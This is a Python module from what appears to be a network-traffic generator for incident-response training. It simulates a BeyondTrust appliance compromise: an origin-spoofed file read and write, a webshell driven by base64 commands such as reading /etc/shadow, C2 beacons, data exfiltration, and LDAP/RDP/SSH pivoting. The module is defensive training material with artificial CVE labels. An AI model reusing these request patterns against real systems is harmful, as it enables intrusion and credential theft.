"""netgen.beyondtrust102764 -- the "BeyondTrust CVE-2026-102764" incident-replay scenario.

A self-contained replay of the BeyondTrust Remote Support / Privileged Remote Access zero-day
(CVE-2026-102764, CVSS 9.3): an improper-origin-validation / authentication-bypass in the
appliance's internal messaging component that lets an unauthenticated remote attacker perform
file operations on the appliance (read secrets, write files). The CVE number, score and
exploitation dates are labels owned by this generator, not verified against a vendor advisory.

Modelled as a selectable scenario (``ir-beyondtrust-cve102764``, category IR), a SIBLING package
to netgen.netscaler / netscaler88771: it reuses their emitter toolkit (crafted TLS 1.3, JA4H-aware
HTTP, the C2 / LDAP / SMB phases) and adds what is specific to this campaign -- a NEW internet-
published appliance host (EXL-BTRS1), its own offender and C2/exfil sinks, the origin-spoofed
file-read/file-write exploit, and the decisive pivot: because the appliance is a privileged-access
*broker*, a compromise lets it originate inbound admin protocols (RDP/SMB/LDAP/SSH) into the estate
-- a DMZ edge device reaching inward is the tell the capture is built to show.

RFC 791 / network-observable: every packet is a real IPv4 datagram (internal RFC 1918 estate +
RFC 5737 documentation ranges for the external actors). The HTTPS legs carry a real key-logged
TLS 1.3 handshake with the HTTP as cleartext in the record (decrypts with the exported keys);
the LDAP, SMB and RDP-negotiation legs are observable on the wire.

PIN-SAFE: every host is injected into ``ctx.h`` INSIDE ``build()``, which runs only when the
scenario is selected and only after ``day.build()`` has scheduled the baseline. A build that does
not select this scenario is byte-for-byte the baseline.
"""
from netgen import flows as F
from netgen.identity import H, get_current
from netgen import protocols as P
from netgen.core import Host

from netgen.netscaler import phases as NSP
from netgen.netscaler.phases import _https_open, _http_req, _https_msg
from netgen.netscaler import _host
from netgen.netscaler import content

_SERVER = NSP._PORTAL_PROFILES["beyondtrust"]["server"]      # one Server banner for the appliance

rng = NSP.rng

# --- the appliance (internet-published edge) and this campaign's external actors -------------
_BTRS_SUFFIX, _BTRS_IP = "BTRS1", "10.10.20.55"      # BeyondTrust Remote Support appliance
_BTRS_MAC = "00:50:56:bb:04:71"
_EXTERNAL = {
    "attacker": ("node102.probe-pool.example", "203.0.113.102", 12),  # offender
    "beacon":   ("upd.bt-telemetry.example",       "192.0.2.102", 13),    # TCP 8443 beacon sink
    "exfil":    ("cdn-bt-updates.com",             "192.0.2.103", 15),    # HTTPS exfil sink (IOC)
    # own benign-workforce identities (shared defect #28): see metabase72898's comment.
    "wfA": ("host-a.bt-telemetry.example", "198.51.100.81", 7),
    "wfB": ("host-b.bt-telemetry.example", "198.51.100.82", 7),
    "wfC": ("host-c.bt-telemetry.example", "198.51.100.83", 7),
    "wfD": ("host-d.bt-telemetry.example", "198.51.100.84", 7),
}


def _inject_hosts(ctx):
    """Add the internet-published BeyondTrust appliance and the external actors. Pin-safe: runs in
    the builder, after the baseline day is built."""
    domain = P.DOMAIN
    bt_name = _host(ctx, _BTRS_SUFFIX)
    if bt_name not in ctx.h:
        ctx.h[bt_name] = Host(bt_name, ctx.link.place(_BTRS_IP), _BTRS_MAC, "https",
                              "BeyondTrust Remote Support appliance (published edge)",
                              ctx.link.server_net, "remotesupport." + domain)
    cache = ctx.__dict__.setdefault("_bt_ext", {})
    for key, (fqdn, ip, hops) in _EXTERNAL.items():
        if key not in cache:
            h = Host(fqdn.split(".")[0].upper(), ip,
                     "02:00:5e:%02x:%02x:%02x" % (rng.randrange(256), rng.randrange(256), rng.randrange(256)),
                     "linux", "external", ip.rsplit(".", 1)[0] + ".0/24", fqdn)
            h.hops = hops
            cache[key] = h
    return cache


# --- CVE-2026-102764-specific phases (origin-spoofed file ops + webshell) --------------------
_OPER_UA = "python-requests/2.32.3"
_WS_PATH = "/nw/content/session_cache.dat"               # the file the operator writes then drives
def _spoof_origin():
    """The improper-origin-validation bypass header, naming the build identity's own remote-support host."""
    return "Origin: https://remotesupport." + get_current().domain

_WS_CMDS = {
    "whoami": (19,), "id": (120,), "uname -a": (118,),
    "cat /etc/shadow": (640,), "cat /var/sra/data/sessions.db": (1480,),
    "ss -tnp state established": (560, 720),
}
_WEBSHELL_LOG = [
    (52, "whoami"), (121, "uname -a"), (240, "cat /var/sra/data/sessions.db"),
    (505, "cat /etc/shadow"), (902, "id"), (1340, "ss -tnp state established"),
    (1980, "cat /var/sra/data/sessions.db"),
]


def _session_rows(ctx, n):
    """Plain-text session rows (estate users and targets) for the session-store reads."""
    hosts = [h for h in (H("WEB1"), H("WEB2"), H("FILE1"), H("MGMT1"), H("SQL1")) if h in ctx.h]
    out = ""
    i = 0
    while len(out) < n:
        out += "%d|%s|%s|rdp|2026-11-06T09:%02d:%02d\n" % (
            1000 + i, P.username_for(H("WS-%03d" % (3 + (i * 7) % 60))), hosts[i % len(hosts)], (i * 3) % 60, (i * 17) % 60)
        i += 1
    return out


def bt_exploit_read(ctx, atk, bt, ts=None):
    """Stage 1a -- CVE-2026-102764: an unauthenticated, origin-spoofed GET to the appliance's
    messaging endpoint reads a secret file off the box (the auth-bypass file-read primitive)."""
    host = "%s:443" % bt.ip
    s = _https_open(ctx, atk, bt, ts, "implant", sni=None, vantage=bt)
    req = _http_req("GET", "/nw/messaging?read=/var/sra/config/appliance.key", host, _OPER_UA,
                    extra=[_spoof_origin()])
    _https_msg(s, req, P.http_response("200 OK", P.blob(812), "application/octet-stream", s.t, server=_SERVER))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


def bt_exploit_write(ctx, atk, bt, ts=None):
    """Stage 1b -- the same bypass used to WRITE a file: drop the operator's agent into the
    web-served content dir (the file-write primitive -> RCE)."""
    host = "%s:443" % bt.ip
    s = _https_open(ctx, atk, bt, ts, "implant", sni=None, vantage=bt)
    shell = b"<%@ run=request.getHeader('X-Cmd') %>"     # placeholder implant marker
    req = _http_req("POST", "/nw/messaging?write=" + _WS_PATH, host, _OPER_UA,
                    extra=[_spoof_origin(), "Content-Type: application/octet-stream"], body=shell)
    _https_msg(s, req, P.http_response("200 OK", b"{\"ok\":true}", "application/json", s.t, server=_SERVER))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


def bt_webshell_cmd(ctx, atk, bt, cmd, ts=None):
    """Stage 1c -- run one command through the planted file (base64 command in X-Cmd)."""
    import base64
    host = "%s:443" % bt.ip
    body_n = rng.choice(_WS_CMDS[cmd])
    s = _https_open(ctx, atk, bt, ts, "implant", sni=None, vantage=bt)
    req = _http_req("GET", _WS_PATH, host, _OPER_UA,
                    extra=["X-Cmd: %s" % base64.b64encode(cmd.encode()).decode()])
    if "shadow" in cmd:
        out = P.blob(body_n)       # credential-shaped content is not generated; left as opaque bytes
    else:
        out = content.linux_cmd_output(cmd, body_n, host="remotesupport", user_pfx=ctx.link.user_net.rsplit(".", 1)[0],
                                       local=bt.ip, extra=_session_rows(ctx, body_n))
    _https_msg(s, req, P.http_response("200 OK", out, "text/plain", s.t, server=_SERVER))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


# subset of the LDAP enum for this campaign, ending in the SPN scan (the enumeration tell)
_BIND = "svc_scan"     # estate service account the appliance's directory integration would use
_ENUM = [("samAccountName", "administrator"), ("samAccountName", _BIND),
         ("samAccountName", "svc_backup"), ("memberOf", "CN=Domain Admins,OU=Groups," + P.BASE_DN),
         ("__SPN__", "*")]


def build(ctx, eng, tag, win):
    """Schedule the CVE-2026-102764 incident: exploit (origin-spoofed file read/write) -> webshell
    -> C2 beacon + first-seen C2 DNS -> session-store exfil -> internal pivot, where the DMZ
    appliance originates admin protocols inward (LDAP SPN scan -> SMB -> RDP to the jump host ->
    SSH to a server). Signature-critical records always emitted; beacon cadence and benign volume
    scale with ctx.scale. Registered as ``ir-beyondtrust-cve102764`` (incidents imports it lazily)."""
    ext = _inject_hosts(ctx)
    from netgen import incidents as INC
    s = INC.sched_factory(eng, ctx, tag, win)
    lo, hi = win
    scale = max(0.01, min(1.0, getattr(ctx, "scale", 1.0)))

    def at(offset):
        return lo + offset

    bt = ctx.h[_host(ctx, _BTRS_SUFFIX)]
    dc1 = ctx.h.get(_host(ctx, "DC1"))
    dc2 = ctx.h.get(_host(ctx, "DC2"))
    mgmt = ctx.h.get(_host(ctx, "MGMT1"))
    app = ctx.h.get(_host(ctx, "WEB1"))
    atk, beacon, exfil = ext["attacker"], ext["beacon"], ext["exfil"]

    # ---- Stage 1: exploit + webshell (inbound HTTPS, offender -> appliance) ----------------
    s(at(14), bt_exploit_read, atk, bt)
    s(at(30), bt_exploit_write, atk, bt)
    for off, cmd in _WEBSHELL_LOG:
        s(at(90 + off), bt_webshell_cmd, atk, bt, cmd)

    # ---- Stage 2: outbound C2 (appliance -> beacon :8443) + first-seen C2 DNS (NXDOMAIN) ----
    if dc1 is not None:
        s(at(840), NSP.c2_dns, bt, dc1, "upd.bt-telemetry.example")
        s(at(1120), NSP.c2_dns, bt, dc1, "cdn-bt-updates.com")
    t, counter = at(900), 1
    while t < hi:
        s(t, NSP.c2_beacon, bt, beacon, counter)
        counter += 1
        t += rng.uniform(60, 100)

    # ---- Stage 2b: session-store exfil (cleartext HTTP PUT to the sink) --------------------
    body = ("# session store export\n" + _session_rows(ctx, 3000)).encode()
    s(at(1180), NSP.config_exfil, bt, exfil, body, path="/staging/sessionstore.db")
    # Bulk data exfil -- the HIGH-volume stage (tens of MB): the appliance's session store dumped to
    # the exfil sink, distinct in a bytes-to-attacker view from the ~KB config PUT and the beacons.
    s(at(1225), NSP.data_exfil, bt, exfil, int(42_000_000 * scale), label="bt-sessionstore.tar")

    # ---- Stage 3: internal pivot -- the DMZ appliance reaches inward (the detection) --------
    if dc1 is not None:
        s(at(1500), NSP.ldaps_routine, bt, dc1)             # routine baseline bind (contrast)
        s(at(1560), NSP.ldap_enum_run, bt, dc1, _ENUM, [i * 4 for i in range(len(_ENUM))], bind=_BIND)
        s(at(1620), NSP.smb_fail, bt, dc1)
    if dc2 is not None:
        s(at(1622), NSP.smb_fail, bt, dc2)
    if mgmt is not None:                                    # RDP to the jump host (broker role)
        s(at(1700), NSP.rdp_pivot, bt, mgmt, _BIND, rng.uniform(60, 180))
    if app is not None:                                     # SSH to an internal server
        s(at(1760), NSP.ssh_test, bt, app, cbanner=b"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\r\n")

    # ---- benign interleave: normal remote-support sessions to the appliance ----------------
    for label in ("A", "B", "C", "D"):
        visits = max(2, int(round(8 * scale)))
        for _ in range(visits):
            client = ext[{"A": "wfA", "B": "wfB", "C": "wfC", "D": "wfD"}[label]]
            s(lo + rng.uniform(0, max(1.0, hi - lo - 60)), NSP.portal_browse, client, bt, label, product="beyondtrust")
